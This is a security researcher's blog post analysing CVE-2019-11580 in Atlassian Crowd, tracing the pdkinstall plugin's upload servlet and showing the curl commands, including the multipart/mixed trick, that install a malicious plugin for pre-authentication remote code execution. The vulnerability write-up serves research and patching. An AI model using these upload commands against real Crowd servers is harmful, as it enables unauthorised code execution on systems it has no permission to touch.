---
layout: post
title: "Analysis of an Atlassian Crowd RCE -  CVE-2019-11580"
author: Corben Leo
---

### <font>&#128075;&#127996; introduction:</font>
Recently I came across an <a target='_blank' rel='noopener noreferrer' class='link' href='https://www.atlassian.com/software/crowd'>Atlassian Crowd</a> application while I was doing recon. If you're not familiar with Crowd, it is a centralized identity management application that allows companies to "Manage users from multiple directories - Active Directory, LDAP, OpenLDAP or Microsoft Azure AD - and control application authentication permissions in one single location."

The installation I found was running an older version, so I resorted to Google to see if there were any vulnerabilities in it and I came across this <a target='_blank' rel='noopener noreferrer' class='link' href='https://confluence.atlassian.com/crowd/crowd-security-advisory-2019-05-22-970260700.html'>advisory</a>: "pdkinstall development plugin incorrectly enabled (CVE-2019-11580)".


Atlassian's description:

> "Crowd and Crowd Data Center had the pdkinstall development plugin incorrectly enabled in release builds. Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center."


After searching for a bit, I couldn't find any proof-of-concepts for the vulnerability, so I decided to analyze it and attempt to create one.

### <font>&#128270; analysis:</font>

I started off by cloning the source code of the plugin which can be found <a target='_blank' rel='noopener noreferrer' class='link' href='https://bitbucket.org/atlassian/pdkinstall-plugin'>here</a>.

```bash
root@doggos:~# git clone https://bitbucket.org/atlassian/pdkinstall-plugin
Cloning into 'pdkinstall-plugin'...
remote: Counting objects: 210, done.
remote: Compressing objects: 100% (115/115), done.
remote: Total 210 (delta 88), reused 138 (delta 56)
Receiving objects: 100% (210/210), 26.20 KiB | 5.24 MiB/s, done.
Resolving deltas: 100% (88/88), done.
```


We can find the `plugin descriptor` file at `./main/resources/atlassian-plugin.xml`. Every plugin needs a `plugin descriptor` file, which simply contains XML that "describes a plugin and the modules contained within it for the host application" - <a target='_blank' rel='noopener noreferrer' class='link' href='https://developer.atlassian.com/server/confluence/creating-your-plugin-descriptor/'>Atlassian</a>.

Let's take a look at it:

```xml
<atlassian-plugin name="${project.name}" key="com.atlassian.pdkinstall" pluginsVersion="2">
<plugin-info>
    <version>${project.version}</version>
    <vendor name="Atlassian Software Systems Pty Ltd" url="http://www.atlassian.com"/>
</plugin-info>

<servlet-filter name="pdk install" key="pdk-install" class="com.atlassian.pdkinstall.PdkInstallFilter" location="before-decoration">
    <url-pattern>/admin/uploadplugin.action</url-pattern>
</servlet-filter>

<servlet-filter name="pdk manage" key="pdk-manage" class="com.atlassian.pdkinstall.PdkPluginsFilter"
    location="before-decoration">
    <url-pattern>/admin/plugins.action</url-pattern>
</servlet-filter>

<servlet-context-listener key="fileCleanup" class="org.apache.commons.fileupload.servlet.FileCleanerCleanup" />
<component key="pluginInstaller" class="com.atlassian.pdkinstall.PluginInstaller" />
</atlassian-plugin>
```



We can see that the Java servlet class `com.atlassian.pdkinstall.PdkInstallFilter` is invoked by visiting `/admin/uploadplugin.action`. Since we know that the vulnerability is RCE via arbitrary plugin installation, it's clear we have to start by looking at the source code of the <a target='_blank' rel='noopener noreferrer' class='link' href='https://bitbucket.org/atlassian/pdkinstall-plugin/src/master/src/main/java/com/atlassian/pdkinstall/PdkInstallFilter.java'>PdkInstallFilter servlet</a>. 

Let's import the pdkinstall-plugin into IntelliJ so we can start reading through the source code. We are going to start in the `doFilter()` method.

We can see <a target='_blank' rel='noopener noreferrer' href='https://bitbucket.org/atlassian/pdkinstall-plugin/src/9ea4e8638bd917af879a4f1b5f5bae05fc2733c8/src/main/java/com/atlassian/pdkinstall/PdkInstallFilter.java#lines-57'>here</a>, that the if the request method isn't POST, it will quit and respond with an error:

```java
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
HttpServletRequest req = (HttpServletRequest) servletRequest;
HttpServletResponse res = (HttpServletResponse) servletResponse;

if (!req.getMethod().equalsIgnoreCase("post"))
{
    res.sendError(HttpServletResponse.SC_BAD_REQUEST, "Requires post");
    return;
}
```


Next, it determines if the request contains multipart content. Multipart content is a single body that contains one or more different sets of data that are combined. If it contains multipart content it will call the `extractJar()` method to extract the jar sent in the request, otherwise it will call the `buildJarFromFiles()` method and attempt to build a plugin jar file from data within the request.


```java
// Check that we have a file upload request
File tmp = null;
boolean isMultipart = ServletFileUpload.isMultipartContent(req);
if (isMultipart)
{
    tmp = extractJar(req, res, tmp);
}
else
{
    tmp = buildJarFromFiles(req);
}
```

Now, let's divert our attention to the `extractJar()` method.



```java
private File extractJar(HttpServletRequest req, HttpServletResponse res, File tmp) throws IOException
{
    // Create a new file upload handler
    ServletFileUpload upload = new ServletFileUpload(factory);

    // Parse the request
    try {
        List<FileItem> items = upload.parseRequest(req);
        for (FileItem item : items)
        {
            if (item.getFieldName().startsWith("file_") && !item.isFormField())
            {
                tmp = File.createTempFile("plugindev-", item.getName());
                tmp.renameTo(new File(tmp.getParentFile(), item.getName()));
                item.write(tmp);
            }
        }
    } catch (FileUploadException e) {
        log.warn(e, e);
        res.sendError(HttpServletResponse.SC_BAD_REQUEST, "Unable to process file upload");
    } catch (Exception e) {
        log.warn(e, e);
        res.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "Unable to process file upload");
    }
    return tmp;
}

```

First, it instantiates a new object of `ServletFileUpload`, then calls the <a target='_blank' rel='noopener noreferrer' class='link' href='http://commons.apache.org/proper/commons-fileupload/javadocs/api-release/org/apache/commons/fileupload/servlet/ServletFileUpload.html#parseRequest-javax.servlet.http.HttpServletRequest-'>`parseRequest()`</a> method to parse the HTTP request. This method processes the `multipart/form-data` stream from the HTTP request and sets the list of <a target='_blank' rel='noopener noreferrer' class='link' href='http://commons.apache.org/proper/commons-fileupload/javadocs/api-release/index.html'>FileItems</a> to a variable called `items`. 

For each `item` (in the list of FileItems), if the field name starts with `file_` <b>and</b> isn't a <a target='_blank' rel='noopener noreferrer' class='link' href='https://commons.apache.org/proper/commons-fileupload/apidocs/org/apache/commons/fileupload/FileItem.html#isFormField--'>form field</a> (an HTML field), it will create and write the file that's being uploaded to a temporary file on the disk. If it fails, the variable `tmp`  will be null; if it's successful, the variable `tmp` will contain the path to the file that was written. This is returned back to the main `doFilter()` method.

```java
if (tmp != null)
{
    List<String> errors = new ArrayList<String>();
    try
    {
        errors.addAll(pluginInstaller.install(tmp));
    }
    catch (Exception ex)
    {
        log.error(ex);
        errors.add(ex.getMessage());
    }

    tmp.delete();

    if (errors.isEmpty())
    {
        res.setStatus(HttpServletResponse.SC_OK);
        servletResponse.setContentType("text/plain");
        servletResponse.getWriter().println("Installed plugin " + tmp.getPath());
    }
    else
    {
        res.setStatus(HttpServletResponse.SC_BAD_REQUEST);
        servletResponse.setContentType("text/plain");
        servletResponse.getWriter().println("Unable to install plugin:");
        for (String err : errors)
        {
            servletResponse.getWriter().println("\t - " + err);
        }
    }
    servletResponse.getWriter().close();
    return;
}
res.sendError(HttpServletResponse.SC_BAD_REQUEST, "Missing plugin file");
```

If `extractJar()` succeeds, the `tmp` variable will be set and not equal to null. The application will attempt to install the plugin with the `pluginInstaller.install()` method and will catch any errors in the process. If there are no errors, the server responds with 200 OK and a message that the plugin was successfully installed. Otherwise, the server will respond with "400 Bad Request" and with the message "Unable to install plugin", along with the errors that caused the installation to fail.

However, if the initial `extractJar()` method fails, the `tmp` variable will be set to null and the server will respond with a "400 Bad Request" along with the message "Missing plugin file".



Now that we know the servlet endpoint and the sort of request it's expecting, let's try to exploit it!

### ✗ attempt #1
Let's spin up an instance using the Atlassian SDK.

Now let’s ensure that we can invoke the pdkinstall plugin by visiting `http://localhost:4990/crowd/admin/uploadplugin.action`.

The server should respond with a 400 Bad Request: 

![UploadPlugin.action](/images/atlassian/uploadpluginaction.png)

Let's attempt to upload a standard plugin by utilizing the knowledge we have so far. I chose to try this with the <a target='_blank' rel='noopener noreferrer' class='link' href='https://bitbucket.org/atlassian/application-links/src/master/applinks-plugin/'>applinks-plugin</a> from the atlassian-bundled-plugins. You can get the compiled jar file from <a target='_blank' rel='noopener noreferrer' class='link' href='https://github.com/lc/research/blob/master/CVE-2019-11580/applinks-plugin-5.2.6.jar'>here</a>.

Here's what we know: The servlet requires a POST request containing multipart data that contains a file that starts with the name `file_`. We can do this easily with cURL's `--form` flag

```bash
root@doggos:~# curl --form "file_cdl=@applinks-plugin-5.2.6.jar" http://localhost:4990/crowd/admin/uploadplugin.action -v
```

![Normal Upload](/images/atlassian/normal-plugin-install.png)

As we can see from the result, it successfully installed the plugin; so we should be able to create and install our own plugin, right? 

I created a malicious plugin which can be found <a target='_blank' rel='noopener noreferrer' class='link' href='https://github.com/lc/research/tree/master/CVE-2019-11580/atlassian-shell'>here</a>

So let's compile it and attempt to upload it.

```bash
root@doggos:~# ./compile.sh
root@doggos:~# curl --form "file_cdl=@rce.jar" http://localhost:8095/crowd/admin/uploadplugin.action -v
```

![Failed Upload](/images/atlassian/failed-upload-plugin.png)

We can see that it fails with a `400 Bad Request` and the response contains the error message `"Missing plugin file"`. We know from earlier that if `tmp` is null, the server responds with this exact message and status-code, but what causes this to happen? Let's attach a debugger.

### &#128187; debugging
I imported the `pdkinstall-plugin` in IntelliJ, attached the debugger to the Crowd instance, and opened up the `PdkInstallFilter.java` servlet which we know is handling the uploads.

My first guess was that the `ServletFileUpload.isMultipartContent(req)` method was failing, so I set a breakpoint there. I then tried uploading my malicious plugin again, however, we can see that it works as normal and the server sees it as multipart content:

![Multipart True](/images/atlassian/debug-multipart.png)

So then it must be `extractJar()` that is failing. Let's debug this method and set breakpoints line-by-line so we can figure out where it fails. After setting breakpoints, I tried again:

![Debugging](/images/atlassian/extractJar-debugging.gif)

We can see that the `upload.parseRequest(req)` method is returning an empty array. Since the `items` variable is empty, it skips the `for` loop and returns `tmp` which is set to null. 

I spent a long time trying to figure out why this was happening and I don't know exactly the root cause of it, but all I cared about was getting RCE. 

What would happen if I changed the `Content-Type` from `multipart/form-data` to a different `multipart` encoding? Let's try it.

### ✗ attempt #2
This time I decided to try uploading my malicious plugin with the Content-Type of `multipart/mixed` instead. Maybe that would work?

```bash
curl -k -H "Content-Type: multipart/mixed" \
  --form "file_cdl=@rce.jar" http://localhost:4990/crowd/admin/uploadplugin.action
```

It responded with a message that the plugin was installed:

![Upload Success](/images/atlassian/upload-success.png)

Let's see if we can actually invoke the malicious plugin:

![Execution](/images/atlassian/invoked-servlet.png)

We now have a pre-auth remote code execution on Atlassian Crowd!


### &#127881; outro:
This lead to criticals on a few bug bounty programs - all of the time I spent analyzing this CVE paid off!

Here's a big takeaway from this:

- Don't be scared to try new things and fail! 

I don't know Java that well, I don't have experience debugging, but that didn't stop me from trying. Try new things, do your research, and struggle - it's a huge part of the learning process!


I hope this post has been interesting and that you enjoyed reading it!
<br>Happy hacking,<br>
**Corben Leo**
- <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
- <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
- <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
- <a class="link" href="https://github.com/lc"  target="_blank" rel="noopener noreferrer">https://github.com/lc</a>


